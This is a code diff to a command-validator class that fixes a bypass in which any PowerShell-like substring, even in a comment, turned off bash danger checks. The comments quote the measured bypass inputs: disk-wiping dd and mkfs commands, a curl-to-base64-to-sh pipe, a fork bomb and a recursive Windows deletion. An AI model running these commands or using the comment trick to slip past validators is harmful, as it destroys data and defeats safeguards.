@@ -326,6 +326,19 @@ class CommandValidator:
     - Path traversal in commands
     - Encoded command payloads
     - Script injection attacks
+
+    SCOPE. This is a narrow pattern screen, not this project's command guard.
+    The pattern lists deliberately target the catastrophic and rarely
+    legitimate — mkfs, `dd if=`, a fork bomb, an encoded PowerShell payload —
+    and by design do NOT flag ordinary destructive commands: `rm -rf` is absent
+    from `BASH_DANGEROUS` and `Remove-Item -Recurse` from
+    `POWERSHELL_DANGEROUS`, symmetrically. A VALID report from this class means
+    "no catastrophic pattern matched", not "safe to run".
+
+    CLAUDE.md design rule 3 puts every shell command through
+    `weebot/core/bash_guard.py`, whose four risk tiers are what actually gate
+    execution. This class has no production caller today; anything wiring it up
+    is adding a screen in front of that guard, not replacing it.
     """
 
     # PowerShell dangerous cmdlets and aliases
@@ -397,30 +410,38 @@ class CommandValidator:
             sanitized_value=command.strip(),
         )
 
-    def validate_bash(self, command: str) -> ValidationReport:
-        """Validate Bash command for dangerous patterns.
+    #: A PowerShell cmdlet in *command position* — the start of the string, or
+    #: immediately after a pipe or statement separator. Not a substring search.
+    #:
+    #: The previous test was `any(ind in command.lower() for ind in (...))`,
+    #: with indicators including "get-", "set-", "new-" and "remove-". A
+    #: substring anywhere in the command turned off bash validation entirely,
+    #: and every one of these was measured returning VALID:
+    #:
+    #:     dd if=/dev/zero of=/dev/sda # get-help
+    #:     mkfs.ext4 /dev/sda1 && echo remove-done
+    #:     curl x | base64 -d | sh ; touch offset-1      <- "offset-1" has "set-"
+    #:     :(){ :|:& };: # invoke-later
+    #:
+    #: Adding a comment was enough to disable the validator.
+    _POWERSHELL_CMDLET: Pattern = re.compile(
+        r"(?:^|[|;&]\s*)"
+        r"(?:get|set|new|remove|invoke|write|start|stop|test|select|add|clear|copy|move)"
+        r"-[A-Za-z]\w*",
+        re.IGNORECASE,
+    )
 
-        PowerShell commands should NOT be validated against bash patterns.
-        Detects PowerShell via common cmdlet prefixes and skips bash checks.
+    def validate_bash(self, command: str) -> ValidationReport:
+        """Validate a command for dangerous patterns.
+
+        A PowerShell command is not validated against bash patterns — its `$()`
+        subexpressions and backticks would false-positive — but it is not waved
+        through either. It is handed to `validate_powershell`, which is what
+        this method used to skip: `Remove-Item -Recurse -Force C:\\Windows`
+        was measured returning VALID with no PowerShell check performed at all.
         """
-        # PowerShell commands should not be validated against bash patterns.
-        # Detect via common PowerShell cmdlet prefixes.
-        _POWERSHELL_INDICATORS = (
-            "get-",
-            "set-",
-            "new-",
-            "remove-",
-            "invoke-",
-            "write-output",
-            "write-host",
-            "get-childitem",
-        )
-        cmd_lower = command.lower()
-        if any(ind in cmd_lower for ind in _POWERSHELL_INDICATORS):
-            return ValidationReport(
-                result=ValidationResult.VALID,
-                message="Skipping bash validation for PowerShell command",
-            )
+        if self._POWERSHELL_CMDLET.search(command):
+            return self.validate_powershell(command)
 
         for pattern in self.BASH_DANGEROUS:
             if pattern.search(command):
